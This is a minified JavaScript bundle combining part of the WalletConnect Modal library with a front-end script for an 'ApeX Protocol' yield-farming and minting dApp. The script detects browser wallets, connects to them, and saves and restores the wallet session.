this.formatUniversalUrl(t,e,n);let r=t;r.includes("://")||(r=t.replaceAll("/","").replaceAll(":",""),r=`${r}://`),r.endsWith("/")||(r=`${r}/`),this.setWalletConnectDeepLink(r,n);const i=encodeURIComponent(e);return`${r}wc?uri=${i}`},formatUniversalUrl(t,e,n){if(!We.isHttpUrl(t))return this.formatNativeUrl(t,e,n);let r=t;if(r.startsWith("https://t.me")){const s=Buffer.from(e).toString("base64").replace(/[=]/g,"");r.endsWith("/")&&(r=r.slice(0,-1)),this.setWalletConnectDeepLink(r,n);const o=new URL(r);return o.searchParams.set("startapp",s),o.toString()}r.endsWith("/")||(r=`${r}/`),this.setWalletConnectDeepLink(r,n);const i=encodeURIComponent(e);return`${r}wc?uri=${i}`},async wait(t){return new Promise(e=>{setTimeout(e,t)})},openHref(t,e){const n=this.isTelegram()?"_blank":e;window.open(t,n,"noreferrer noopener")},setWalletConnectDeepLink(t,e){try{localStorage.setItem(We.WALLETCONNECT_DEEPLINK_CHOICE,JSON.stringify({href:t,name:e}))}catch{console.info("Unable to set WalletConnect deep link")}},setWalletConnectAndroidDeepLink(t){try{const[e]=t.split("?");localStorage.setItem(We.WALLETCONNECT_DEEPLINK_CHOICE,JSON.stringify({href:e,name:"Android"}))}catch{console.info("Unable to set WalletConnect android deep link")}},removeWalletConnectDeepLink(){try{localStorage.removeItem(We.WALLETCONNECT_DEEPLINK_CHOICE)}catch{console.info("Unable to remove WalletConnect deep link")}},setModalVersionInStorage(){try{typeof localStorage<"u"&&localStorage.setItem(We.WCM_VERSION,"2.7.0")}catch{console.info("Unable to set Web3Modal version in storage")}},getWalletRouterData(){var t;const e=(t=Xg.state.data)==null?void 0:t.Wallet;if(!e)throw new Error('Missing "Wallet" view data');return e}},m4=typeof location<"u"&&(location.hostname.includes("localhost")||location.protocol.includes("https")),ze=kn({enabled:m4,userSessionId:"",events:[],connectedWalletId:void 0}),w4={state:ze,subscribe(t){return fr(ze.events,()=>t(y4(ze.events[ze.events.length-1])))},initialize(){ze.enabled&&typeof(crypto==null?void 0:crypto.randomUUID)<"u"&&(ze.userSessionId=crypto.randomUUID())},setConnectedWalletId(t){ze.connectedWalletId=t},click(t){if(ze.enabled){const e={type:"CLICK",name:t.name,userSessionId:ze.userSessionId,timestamp:Date.now(),data:t};ze.events.push(e)}},track(t){if(ze.enabled){const e={type:"TRACK",name:t.name,userSessionId:ze.userSessionId,timestamp:Date.now(),data:t};ze.events.push(e)}},view(t){if(ze.enabled){const e={type:"VIEW",name:t.name,userSessionId:ze.userSessionId,timestamp:Date.now(),data:t};ze.events.push(e)}}},Mt=kn({chains:void 0,walletConnectUri:void 0,isAuth:!1,isCustomDesktop:!1,isCustomMobile:!1,isDataLoaded:!1,isUiLoaded:!1}),$t={state:Mt,subscribe(t){return fr(Mt,()=>t(Mt))},setChains(t){Mt.chains=t},setWalletConnectUri(t){Mt.walletConnectUri=t},setIsCustomDesktop(t){Mt.isCustomDesktop=t},setIsCustomMobile(t){Mt.isCustomMobile=t},setIsDataLoaded(t){Mt.isDataLoaded=t},setIsUiLoaded(t){Mt.isUiLoaded=t},setIsAuth(t){Mt.isAuth=t}},as=kn({projectId:"",mobileWallets:void 0,desktopWallets:void 0,walletImages:void 0,chains:void 0,enableAuthMode:!1,enableExplorer:!0,explorerExcludedWalletIds:void 0,explorerRecommendedWalletIds:void 0,termsOfServiceUrl:void 0,privacyPolicyUrl:void 0}),Lr={state:as,subscribe(t){return fr(as,()=>t(as))},setConfig(t){var e,n;w4.initialize(),$t.setChains(t.chains),$t.setIsAuth(!!t.enableAuthMode),$t.setIsCustomMobile(!!((e=t.mobileWallets)!=null&&e.length)),$t.setIsCustomDesktop(!!((n=t.desktopWallets)!=null&&n.length)),We.setModalVersionInStorage(),Object.assign(as,t)}};var b4=Object.defineProperty,If=Object.getOwnPropertySymbols,v4=Object.prototype.hasOwnProperty,E4=Object.prototype.propertyIsEnumerable,Sf=(t,e,n)=>e in t?b4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,x4=(t,e)=>{for(var n in e||(e={}))v4.call(e,n)&&Sf(t,n,e[n]);if(If)for(var n of If(e))E4.call(e,n)&&Sf(t,n,e[n]);return t};const pc="https://explorer-api.walletconnect.com",gc="wcm",yc="js-2.7.0";async function cs(t,e){const n=x4({sdkType:gc,sdkVersion:yc},e),r=new URL(t,pc);return r.searchParams.append("projectId",Lr.state.projectId),Object.entries(n).forEach(([s,o])=>{o&&r.searchParams.append(s,String(o))}),(await fetch(r)).json()}const qn={async getDesktopListings(t){return cs("/w3m/v1/getDesktopListings",t)},async getMobileListings(t){return cs("/w3m/v1/getMobileListings",t)},async getInjectedListings(t){return cs("/w3m/v1/getInjectedListings",t)},async getAllListings(t){return cs("/w3m/v1/getAllListings",t)},getWalletImageUrl(t){return`${pc}/w3m/v1/getWalletImage/${t}?projectId=${Lr.state.projectId}&sdkType=${gc}&sdkVersion=${yc}`},getAssetImageUrl(t){return`${pc}/w3m/v1/getAssetImage/${t}?projectId=${Lr.state.projectId}&sdkType=${gc}&sdkVersion=${yc}`}};var _4=Object.defineProperty,Df=Object.getOwnPropertySymbols,I4=Object.prototype.hasOwnProperty,S4=Object.prototype.propertyIsEnumerable,Af=(t,e,n)=>e in t?_4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,D4=(t,e)=>{for(var n in e||(e={}))I4.call(e,n)&&Af(t,n,e[n]);if(Df)for(var n of Df(e))S4.call(e,n)&&Af(t,n,e[n]);return t};const Of=We.isMobile(),Lt=kn({wallets:{listings:[],total:0,page:1},search:{listings:[],total:0,page:1},recomendedWallets:[]}),g5={state:Lt,async getRecomendedWallets(){const{explorerRecommendedWalletIds:t,explorerExcludedWalletIds:e}=Lr.state;if(t==="NONE"||e==="ALL"&&!t)return Lt.recomendedWallets;if(We.isArray(t)){const r={recommendedIds:t.join(",")},{listings:i}=await qn.getAllListings(r),s=Object.values(i);s.sort((o,a)=>{const c=t.indexOf(o.id),l=t.indexOf(a.id);return c-l}),Lt.recomendedWallets=s}else{const{chains:n,isAuth:r}=$t.state,i=n?.join(","),s=We.isArray(e),o={page:1,sdks:r?"auth_v1":void 0,entries:We.RECOMMENDED_WALLET_AMOUNT,chains:i,version:2,excludedIds:s?e.join(","):void 0},{listings:a}=Of?await qn.getMobileListings(o):await qn.getDesktopListings(o);Lt.recomendedWallets=Object.values(a)}return Lt.recomendedWallets},async getWallets(t){const e=D4({},t),{explorerRecommendedWalletIds:n,explorerExcludedWalletIds:r}=Lr.state,{recomendedWallets:i}=Lt;if(r==="ALL")return Lt.wallets;i.length?e.excludedIds=i.map(h=>h.id).join(","):We.isArray(n)&&(e.excludedIds=n.join(",")),We.isArray(r)&&(e.excludedIds=[e.excludedIds,r].filter(Boolean).join(",")),$t.state.isAuth&&(e.sdks="auth_v1");const{page:s,search:o}=t,{listings:a,total:c}=Of?await qn.getMobileListings(e):await qn.getDesktopListings(e),l=Object.values(a),u=o?"search":"wallets";return Lt[u]={listings:[...Lt[u].listings,...l],total:c,page:s??1},{listings:l,total:c}},getWalletImageUrl(t){return qn.getWalletImageUrl(t)},getAssetImageUrl(t){return qn.getAssetImageUrl(t)},resetSearch(){Lt.search={listings:[],total:0,page:1}}},Ir=kn({open:!1}),ga={state:Ir,subscribe(t){return fr(Ir,()=>t(Ir))},async open(t){return new Promise(e=>{const{isUiLoaded:n,isDataLoaded:r}=$t.state;if(We.removeWalletConnectDeepLink(),$t.setWalletConnectUri(t?.uri),$t.setChains(t?.chains),Xg.reset("ConnectWallet"),n&&r)Ir.open=!0,e();else{const i=setInterval(()=>{const s=$t.state;s.isUiLoaded&&s.isDataLoaded&&(clearInterval(i),Ir.open=!0,e())},200)}})},close(){Ir.open=!1}};var A4=Object.defineProperty,$f=Object.getOwnPropertySymbols,O4=Object.prototype.hasOwnProperty,$4=Object.prototype.propertyIsEnumerable,Cf=(t,e,n)=>e in t?A4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,C4=(t,e)=>{for(var n in e||(e={}))O4.call(e,n)&&Cf(t,n,e[n]);if($f)for(var n of $f(e))$4.call(e,n)&&Cf(t,n,e[n]);return t};function P4(){return typeof matchMedia<"u"&&matchMedia("(prefers-color-scheme: dark)").matches}const oi=kn({themeMode:P4()?"dark":"light"}),Pf={state:oi,subscribe(t){return fr(oi,()=>t(oi))},setThemeConfig(t){const{themeMode:e,themeVariables:n}=t;e&&(oi.themeMode=e),n&&(oi.themeVariables=C4({},n))}},zn=kn({open:!1,message:"",variant:"success"}),y5={state:zn,subscribe(t){return fr(zn,()=>t(zn))},openToast(t,e){zn.open=!0,zn.message=t,zn.variant=e},closeToast(){zn.open=!1}};class T4{constructor(e){this.openModal=ga.open,this.closeModal=ga.close,this.subscribeModal=ga.subscribe,this.setTheme=Pf.setThemeConfig,Pf.setThemeConfig(e),Lr.setConfig(e),this.initUi()}async initUi(){if(typeof window<"u"){await u4(()=>import("./index-Crrts2R4.js"),[]);const e=document.createElement("wcm-modal");document.body.insertAdjacentElement("beforeend",e),$t.setIsUiLoaded(!0)}}}document.addEventListener("DOMContentLoaded",async()=>{console.log(" main.js loaded - Enhanced Desktop Wallet Detection");const t=document.getElementById("connectButton"),e=document.getElementById("walletButton"),n=document.getElementById("claimStatus");let r=null,i,s;function o(E,S,D=""){if(E)switch(E.style.display="inline-block",E.style.padding="14px 28px",E.style.borderRadius="8px",E.style.fontWeight="600",E.style.border="none",E.style.cursor=S==="loading"?"not-allowed":"pointer",E.style.transition="all 0.3s ease",E.style.color="white",E.style.fontSize="16px",E.style.fontFamily="'Inter', sans-serif",E.style.boxShadow="0 4px 12px rgba(0, 0, 0, 0.15)",E.style.minWidth="180px",E.disabled=S==="loading",S){case"loading":E.style.background="linear-gradient(135deg, #666666 0%, #888888 100%)",E.style.boxShadow="0 2px 8px rgba(102, 102, 102, 0.3)",E.innerHTML='<i class="fas fa-spinner fa-spin" style="margin-right: 8px"></i> Connecting...';break;case"connected":E.style.background="linear-gradient(135deg, #10B981 0%, #059669 100%)",E.style.boxShadow="0 4px 12px rgba(16, 185, 129, 0.3)",E.innerHTML='<i class="fas fa-check-circle" style="margin-right: 8px"></i> Connected';break;case"disconnect":E.style.background="linear-gradient(135deg, #EF4444 0%, #DC2626 100%)",E.style.boxShadow="0 4px 12px rgba(239, 68, 68, 0.3)",E.innerHTML='<i class="fas fa-power-off" style="margin-right: 8px"></i> Disconnect';break;case"failed":E.style.background="linear-gradient(135deg, #EF4444 0%, #DC2626 100%)",E.style.boxShadow="0 4px 12px rgba(239, 68, 68, 0.3)",E.innerHTML='<i class="fas fa-exclamation-triangle" style="margin-right: 8px"></i> Failed',setTimeout(()=>{o(E,"normal")},3e3);break;case"normal":default:E.style.background="linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)",E.style.boxShadow="0 4px 12px rgba(255, 107, 0, 0.3)",E.innerHTML='<i class="fas fa-wallet" style="margin-right: 8px"></i> Connect Wallet to Mint',E.onmouseenter=()=>{E.disabled||(E.style.transform="translateY(-2px)",E.style.boxShadow="0 6px 16px rgba(255, 107, 0, 0.4)")},E.onmouseleave=()=>{E.style.transform="translateY(0)",E.style.boxShadow="0 4px 12px rgba(255, 107, 0, 0.3)"};break}}function a(E,S="info"){if(n){switch(n.textContent=E,n.className=`status ${S}`,n.style.display="block",n.style.padding="12px 16px",n.style.borderRadius="8px",n.style.marginTop="12px",n.style.fontWeight="500",n.style.fontSize="14px",n.style.textAlign="center",n.style.transition="all 0.3s ease",S){case"success":n.style.background="linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)",n.style.color="#166534",n.style.border="1px solid #86EFAC";break;case"error":n.style.background="linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)",n.style.color="#991B1B",n.style.border="1px solid #FCA5A5";break;case"info":default:n.style.background="linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)",n.style.color="#1E40AF",n.style.border="1px solid #93C5FD";break}(S==="error"||S==="success")&&setTimeout(()=>{n.style.opacity="0",setTimeout(()=>{n.style.display="none",n.style.opacity="1"},300)},5e3)}}o(t,"normal"),e&&o(e,"normal");const c="ea2ef1ec737f10116a4329a7c5629979",l={name:"ApeX Protocol",description:"AI-Optimized Yield Farming DApp",url:window.location.origin,icons:["https://walletconnect.com/walletconnect-logo.png"]};function u(){return/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)}function h(E,S=null){localStorage.setItem("connectedWallet",E),S&&localStorage.setItem("walletConnectSession",JSON.stringify(S))}function f(){return localStorage.getItem("connectedWallet")}function p(){const E=localStorage.getItem("walletConnectSession");return E?JSON.parse(E):null}function d(){localStorage.removeItem("connectedWallet"),localStorage.removeItem("walletConnectSession")}function g(E){o(t,"disconnect"),e&&o(e,"disconnect");let S=document.getElementById("connectedAddressDisplay");S||(S=document.createElement("div"),S.id="connectedAddressDisplay",S.style.marginTop="12px",S.style.padding="10px 16px",S.style.fontFamily="'JetBrains Mono', 'Monaco', 'Consolas', monospace",S.style.fontSize="14px",S.style.color="#059669",S.style.textAlign="center",S.style.background="linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)",S.style.borderRadius="8px",S.style.border="1px solid #A7F3D0",S.style.boxShadow="0 2px 8px rgba(5, 150, 105, 0.1)",t.parentNode.appendChild(S));const D=`${E.slice(0,6)}...${E.slice(-4)}`;S.innerHTML=`
      <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
        <i class="fas fa-check-circle" style="color: #059669;"></i>
        <span>Connected: ${D}</span>
        <button id="copyAddress" style="background: none; border: none; color: #059669; cursor: pointer; padding: 4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `,document.getElementById("copyAddress").addEventListener("click",()=>{navigator.clipboard.writeText(E).then(()=>{const P=document.getElementById("copyAddress"),y=P.innerHTML;P.innerHTML='<i class="fas fa-check"></i>',P.style.color="#10B981",setTimeout(()=>{P.innerHTML=y,P.style.color="#059669"},2e3)})}),a("Wallet connected successfully!","success")}function w(){o(t,"normal"),e&&o(e,"normal");const E=document.getElementById("connectedAddressDisplay");E&&E.remove(),a("Wallet disconnected","info")}async function _(){if(!(i&&s))try{const E=rl.init({projectId:c,metadata:l,relayUrl:"wss://relay.walletconnect.com"}),S=new Promise((D,P)=>setTimeout(()=>P(new Error("WalletConnect initialization timeout")),1e4));i=await Promise.race([E,S]);try{s=new T4({projectId:c,themeMode:"dark",themeVariables:{"--wcm-z-index":"9999","--wcm-accent-color":"#FF6B00","--wcm-background-color":"#1F2937","--wcm-font-family":"'Inter', sans-serif"},enableExplorer:!0,explorerRecommendedWalletIds:["c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96","4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0","1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369","fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa","ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18"],explorerExcludedWalletIds:[]}),console.log(" WalletConnect SignClient + Modal initialized")}catch(D){console.warn(" WalletConnect Modal initialization warning:",D),s=null}return!0}catch(E){return console.error(" WalletConnect initialization failed:",E),a("Wallet connection service unavailable. Please refresh and try again.","error"),!1}}function C(){return new Promise(E=>{const S={metamask:!!window.ethereum?.isMetaMask,trust:!!window.ethereum?.isTrust,rainbow:!!window.ethereum?.isRainbow,coinbase:!!window.ethereum?.isCoinbaseWallet,phantom:!!window.ethereum?.isPhantom,brave:!!window.ethereum?.isBraveWallet,rabby:!!window.ethereum?.isRabby,okx:!!window.ethereum?.isOKExWallet,bitget:!!window.ethereum?.isBitKeep};window.eip6963Providers&&window.eip6963Providers.forEach(D=>{if(D.info.rdns){const P=D.info.rdns.toLowerCase();P.includes("metamask")&&(S.metamask=!0),P.includes("trust")&&(S.trust=!0),P.includes("rainbow")&&(S.rainbow=!0),P.includes("coinbase")&&(S.coinbase=!0),P.includes("phantom")&&(S.phantom=!0),P.includes("brave")&&(S.brave=!0),P.includes("rabby")&&(S.rabby=!0),P.includes("okx")&&(S.okx=!0),P.includes("bitget")&&(S.bitget=!0)}}),window.ethereum?.providers&&window.ethereum.providers.forEach(D=>{D.isMetaMask&&!S.metamask&&(S.metamask=!0),D.isTrust&&!S.trust&&(S.trust=!0),D.isRainbow&&!S.rainbow&&(S.rainbow=!0),D.isCoinbaseWallet&&!S.coinbase&&(S.coinbase=!0),D.isPhantom&&!S.phantom&&(S.phantom=!0),D.isBraveWallet&&!S.brave&&(S.brave=!0),D.isRabby&&!S.rabby&&(S.rabby=!0)}),console.log(" Enhanced wallet detection:",S),E(S)})}async function v(){try{const E=await C(),S=Object.keys(E).filter(P=>E[P]);if(S.length===0)return console.log(" No installed wallets detected, using WalletConnect modal"),!1;console.log(` Found installed wallets: ${S.join(", ")}`);let D=window.ethereum;if(window.ethereum?.providers&&window.ethereum.providers.length>0){D=window.ethereum.providers[0];const P=["metamask","coinbase","rabby","trust","brave"];for(const y of P)if(E[y]){const m=window.ethereum.providers.find(I=>!!(y==="metamask"&&I.isMetaMask||y==="coinbase"&&I.isCoinbaseWallet||y==="rabby"&&I.isRabby||y==="trust"&&I.isTrust||y==="brave"&&I.isBraveWallet));if(m){D=m;break}}}if(D){console.log(` Attempting direct connection with ${D.isMetaMask?"MetaMask":D.isCoinbaseWallet?"Coinbase":"detected wallet"}...`);try{const P=await D.request({method:"eth_requestAccounts"});if(P&&P.length>0){const y=P[0];return console.log(" Direct wallet connection successful:",y),g(y),h(y),!0}}catch(P){console.warn(" Direct wallet connection failed:",P)}}return a(`Found ${S.length} wallet(s) - using WalletConnect`,"info"),!1}catch(E){return console.error(" Desktop wallet connection error:",E),!1}}async function b(){try{if(!await _()){o(t,"failed"),e&&o(e,"failed");return}a("Requesting wallet connection...","info");const{uri:S,approval:D}=await i.connect({requiredNamespaces:{eip155:{methods:["eth_sendTransaction","personal_sign","eth_signTypedData_v4"],chains:["eip155:1"],events:["chainChanged","accountsChanged"]}}});if(S)if(s)try{s.openModal({uri:S}),u()?a("Select your wallet from the list","info"):a("Select your wallet from the list or scan QR code","info")}catch(m){console.warn(" Modal opening failed:",m),a("Please manually connect using your wallet app","info")}else a("Please manually connect using your wallet app","info");const P=await Promise.race([D(),new Promise((m,I)=>setTimeout(()=>I(new Error("Connection timeout")),6e4))]);s&&s.closeModal(),x(P)||(o(t,"failed"),e&&o(e,"failed"))}catch(E){console.error(" WalletConnect connection failed:",E),o(t,"failed"),e&&o(e,"failed"),s&&s.closeModal(),E.message?.includes("User rejected")||E.message?.includes("Cancelled")?a("Connection cancelled by user","error"):E.message?.includes("timeout")?a("Connection timeout - please try again","error"):a("Wallet connection failed","error")}}function x(E){if(E?.namespaces?.eip155?.accounts?.length){const S=E.namespaces.eip155.accounts[0].split(":")[2];return console.log(" Connected wallet:",S),r=E,g(S),h(S,E),!0}else return console.error(" No accounts found in session"),a("No accounts found in wallet","error"),!1}async function O(){try{if(o(t,"loading"),e&&o(e,"loading"),a("Initializing wallet connection...","info"),u())console.log(" Mobile detected - using WalletConnect modal only"),await b();else{if(console.log(" Desktop detected - attempting enhanced wallet connection..."),await v())return;console.log(" Direct connection not available, using WalletConnect with enhanced modal..."),await b()}}catch(E){console.error(" Wallet connection failed:",E),o(t,"failed"),e&&o(e,"failed"),E.message?.includes("User rejected")||E.message?.includes("Cancelled")?a("Connection cancelled by user","error"):E.message?.includes("timeout")?a("Connection timeout - please try again","error"):a("Wallet connection failed","error")}}async function B(){try{r&&(await i.disconnect({topic:r.topic,reason:{code:6e3,message:"User disconnected"}}),r=null)}catch(E){console.warn(" Disconnect error:",E)}w(),d()}const k=async()=>{f()&&r?await B():await O()};t&&t.addEventListener("click",k),e&&e.addEventListener("click",k);async function $(){const E=f(),S=p();if(E&&S){if(console.log(" Restoring saved wallet and session:",E),!await _()){console.log(" Failed to initialize WalletConnect for session restoration"),d();return}try{const P=i.session.get(S.topic);P?(r=P,g(E),console.log(" Wallet session restored successfully"),a("Wallet connection restored","success")):(console.log(" Session not found, clearing saved data"),d())}catch(P){console.error(" Error restoring session:",P),d()}}else E&&!S&&(console.log(" Restoring direct wallet connection:",E),g(E),a("Wallet connection restored","success"))}await $(),setTimeout(()=>{i&&(i.on("session_update",({params:E})=>{console.log(" Session updated:",E);const S=E.namespaces?.eip155?.accounts;if(S?.length){const D=S[0].split(":")[2];g(D),a("Wallet session updated","info")}}),i.on("session_delete",()=>{console.log(" Session deleted"),w(),d(),a("Wallet disconnected by provider","error")}),i.on("session_event",E=>{console.log(" Session event:",E)}),i.on("session_connect",E=>{console.log(" Session connected:",E),x(E)}))},1e3);function N(){typeof window<"u"&&(window.eip6963Providers||(window.eip6963Providers=[]),window.addEventListener("eip6963:announceProvider",E=>{console.log(" EIP-6963 Provider detected:",E.detail.info.name),window.eip6963Providers.some(D=>D.info.uuid===E.detail.info.uuid)||(window.eip6963Providers.push(E.detail),console.log(` Added EIP-6963 provider: ${E.detail.info.name}`))}),window.dispatchEvent(new Event("eip6963:requestProvider")),setTimeout(()=>{window.dispatchEvent(new Event("eip6963:requestProvider"))},1e3))}N(),document.addEventListener("visibilitychange",()=>{!document.hidden&&f()&&console.log(" Page visible, checking connection state...")}),window.addEventListener("beforeunload",()=>{s&&s.closeModal()}),window.ethereum&&(window.ethereum.on("accountsChanged",E=>{E.length===0?(console.log(" Accounts disconnected"),w(),d(),a("Wallet disconnected","info")):(console.log(" Accounts changed:",E[0]),g(E[0]),h(E[0]))}),window.ethereum.on("chainChanged",E=>{console.log(" Chain changed:",E),a(`Network changed to ${E}`,"info")}),window.ethereum.on("disconnect",()=>{console.log(" Provider disconnected"),w(),d(),a("Wallet disconnected","info")})),window.addEventListener("error",E=>{console.error(" Global error caught:",E.error),E.error&&E.error.message&&E.error.message.includes("WalletConnect")&&console.warn(" WalletConnect related error detected")}),setTimeout(()=>{i||console.warn(" WalletConnect client not initialized - silent mode")},3e3)});export{We as C,g5 as E,ga as M,$t as O,Xg as R,Pf as T,Lr as a,y5 as b,w4 as c,Ff as g};
